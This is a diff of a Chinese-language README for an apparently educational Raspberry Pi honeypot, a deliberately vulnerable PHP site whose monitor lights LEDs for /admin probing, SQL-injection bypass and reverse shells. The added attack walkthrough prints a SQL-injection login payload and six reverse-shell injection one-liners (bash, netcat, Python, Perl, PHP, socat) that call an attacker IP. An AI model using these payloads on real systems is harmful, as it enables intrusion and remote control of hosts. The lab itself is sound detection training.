@@ -37,8 +37,7 @@
 │                     ┌──────┼──────┐                 │
 │                     ▼      ▼      ▼                 │
 │                  LED1   LED2   LED3                  │
-│                 GPIO17  GPIO27 GPIO22                │
-│                  黃色    紅色    紅色                  │
+│                GPIO 22 GPIO 24 GPIO 25              │
 │               /admin   SQLi   Reverse               │
 │                探測     繞過    Shell                 │
 └─────────────────────────────────────────────────────┘
@@ -55,37 +54,41 @@ iot-honeypot/
 │   ├── Dockerfile            # Python 3.9 + Docker CLI + RPi.GPIO
 │   ├── monitor.py            # 防禦監控主程式（雙執行緒）
 │   └── requirements.txt      # Python 相依套件
-└── web/
-    ├── Dockerfile            # PHP 8.2 + Apache + net-tools
-    └── src/
-        ├── index.php             # 首頁（SmartHome IoT Hub 公開頁面）
-        ├── admin_login_v2.php    # 管理員登入頁（含 SQL Injection 漏洞）
-        ├── dashboard.php         # 後台儀表板（商品管理）
-        ├── network.php           # 網路診斷頁（含 Command Injection 漏洞）
-        ├── logout.php            # 登出處理
-        ├── setup_db.php          # 資料庫初始化腳本
-        ├── .htaccess             # URL 重寫 + 封鎖 setup_db.php
-        ├── css/
-        │   └── bootstrap.min.css
-        └── js/
-            └── bootstrap.bundle.min.js
+├── web/
+│   ├── Dockerfile            # PHP 8.2 + Apache + Reverse Shell 工具
+│   └── src/
+│       ├── index.php             # 首頁（SmartHome IoT Hub 公開頁面）
+│       ├── admin_login_v2.php    # 管理員登入頁（含 SQL Injection 漏洞）
+│       ├── dashboard.php         # 後台儀表板（商品管理）
+│       ├── network.php           # 網路診斷頁（含 Command Injection 漏洞）
+│       ├── logout.php            # 登出處理
+│       ├── setup_db.php          # 資料庫初始化腳本
+│       ├── .htaccess             # URL Rewrite + 封鎖 setup_db.php
+│       ├── css/
+│       │   └── bootstrap.min.css
+│       └── js/
+│           └── bootstrap.bundle.min.js
+└── docs/
+    ├── sequence-diagrams.puml    # 時序圖（PlantUML）
+    ├── flowchart.puml            # 程式邏輯流程圖（PlantUML）
+    └── experiment-flowchart.puml # 實驗進行流程圖（PlantUML）
 ```
 
 ## 三大偵測機制
 
-### LED1 — 路徑探測警示（GPIO 17，黃色）
+### LED1 — 路徑探測警示（GPIO 22）
 
-透過 `docker logs -f` 即時串流 web 容器的 Apache Access Log，使用正規表示法比對：
+透過 `docker logs -f` 串流讀取 Web Container 的 Docker Log，使用 Regex 比對：
 
 ```
-GET /admin[\s/\?]
+GET /admin[\s/?]
 ```
 
 當攻擊者嘗試存取 `/admin` 路徑時，LED1 常亮。
 
-### LED2 — SQL Injection 繞過警示（GPIO 27，紅色）
+### LED2 — SQL Injection 繞過警示（GPIO 24）
 
-同樣監控 Docker Log，分析 HTTP Status Code：
+同樣透過 Docker Log 監控，分析 HTTP Status Code：
 
 ```
 "GET /dashboard\.php\b[^"]*"\s+200\b
@@ -93,25 +96,29 @@ GET /admin[\s/\?]
 
 當 `dashboard.php` 回傳 HTTP 200（代表驗證機制已被繞過），LED2 常亮。
 
-### LED3 — Reverse Shell 警示（GPIO 22，紅色）
+### LED3 — Reverse Shell 警示（GPIO 25）
 
-定期透過 `docker exec` 在 web 容器內執行 `netstat -tn`，取得網路連線快照。
-系統採用 IP 白名單機制，啟動時自動偵測 Docker 網段並加入白名單，固定白名單包含：
+透過 `docker exec` 在 Web Container 內持續執行 `netstat -tn`，取得網路連線快照。偵測邏輯採用兩層過濾：
+
+1. **Local Port 過濾**：排除 Local Port 為 80 的連線（正常 HTTP 請求）
+2. **IP Whitelist 過濾**：排除 Whitelist 內的 IP（容器間內部通訊）
+
+Whitelist 啟動時自動建立，包含：
 
 | 網段 | 用途 |
 |------|------|
 | `127.0.0.0/8` | Loopback |
 | `169.254.0.0/16` | Link-local |
-| Docker 網段（自動偵測） | 容器間內部通訊 |
+| Docker Subnet（自動偵測） | 容器間內部通訊 |
 
-一旦偵測到容器對外建立非白名單的 ESTABLISHED 連線，判定為 Reverse Shell，LED3 常亮。
+一旦偵測到 Local Port 非 80 且目標連線 IP 不在 Whitelist 中的 ESTABLISHED 連線，判定為 Reverse Shell，LED3 常亮。
 
 ## 環境需求
 
 - Raspberry Pi（建議 Pi 4，需有 GPIO）
 - Raspberry Pi OS（64-bit 建議）
 - Docker 與 Docker Compose
-- 三顆 LED + 電阻，接線至 GPIO 17、27、22（BCM 模式）
+- 三顆 LED + 220Ω 電阻，接線至 GPIO 22、24、25（BCM 模式）
 
 ## 快速部署
 
@@ -143,7 +150,7 @@ curl http://<Pi_IP>:8080/admin
 ### 階段二：SQL Injection（觸發 LED2）
 
 1. 進入登入頁面 `http://<Pi_IP>:8080/admin`
-2. 使用 SQL Injection payload 登入：
+2. 使用 SQL Injection Payload 登入：
    - 帳號：`' OR '1'='1' --`
    - 密碼：任意值
 3. 成功繞過驗證進入 `dashboard.php`，LED2 亮起
@@ -151,11 +158,43 @@ curl http://<Pi_IP>:8080/admin
 ### 階段三：Command Injection + Reverse Shell（觸發 LED3）
 
 1. 登入後進入「網路診斷」頁面
-2. 在 IP 輸入欄位注入指令，建立 Reverse Shell：
+2. 攻擊者先在本機開啟 Listener：
+   ```bash
+   nc -lvnp 4444
    ```
-   ; bash -i >& /dev/tcp/<攻擊者IP>/<PORT> 0>&1
+3. 在 IP 輸入欄位注入指令，建立 Reverse Shell（以下擇一）：
+
+   **Bash**
    ```
-3. 容器對外建立非白名單的 ESTABLISHED 連線，LED3 亮起
+   ; bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1
+   ```
+
+   **Netcat**
+   ```
+   ; nc -e /bin/bash <攻擊者IP> 4444
+   ```
+
+   **Python3**
+   ```
+   ; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<攻擊者IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+   ```
+
+   **Perl**
+   ```
+   ; perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("<攻擊者IP>")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i")'
+   ```
+
+   **PHP**
+   ```
+   ; php -r '$sock=fsockopen("<攻擊者IP>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+   ```
+
+   **Socat**
+   ```
+   ; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<攻擊者IP>:4444
+   ```
+
+4. Container 對外建立連線，LED3 亮起
 
 ## 技術棧
 
@@ -167,14 +206,27 @@ curl http://<Pi_IP>:8080/admin
 | 容器化 | Docker、Docker Compose |
 | 偵測方式 | Docker Log 分析、Netstat 連線快照 |
 
+## Web Container 內建工具
+
+| 工具 | 用途 |
+|------|------|
+| `bash` | Bash Reverse Shell |
+| `nc` (netcat-traditional) | Netcat Reverse Shell（支援 `-e` 參數） |
+| `python3` | Python Reverse Shell |
+| `perl` | Perl Reverse Shell |
+| `php` | PHP Reverse Shell（容器內建） |
+| `socat` | Socat Reverse Shell |
+| `curl` | 下載惡意腳本 |
+| `ping` | 網路診斷頁面使用 |
+
 ## GPIO 接線圖
 
 ```
 Raspberry Pi GPIO（BCM 模式）
 ─────────────────────────────
-GPIO 17 ──── 330Ω ──── LED1（黃色）──── GND
-GPIO 27 ──── 330Ω ──── LED2（紅色）──── GND
-GPIO 22 ──── 330Ω ──── LED3（紅色）──── GND
+GPIO 22 ──── 220Ω ──── LED1（/admin 探測）──── GND
+GPIO 24 ──── 220Ω ──── LED2（SQLi 繞過）──── GND
+GPIO 25 ──── 220Ω ──── LED3（Reverse Shell）──── GND
 ```
 
 ## 注意事項
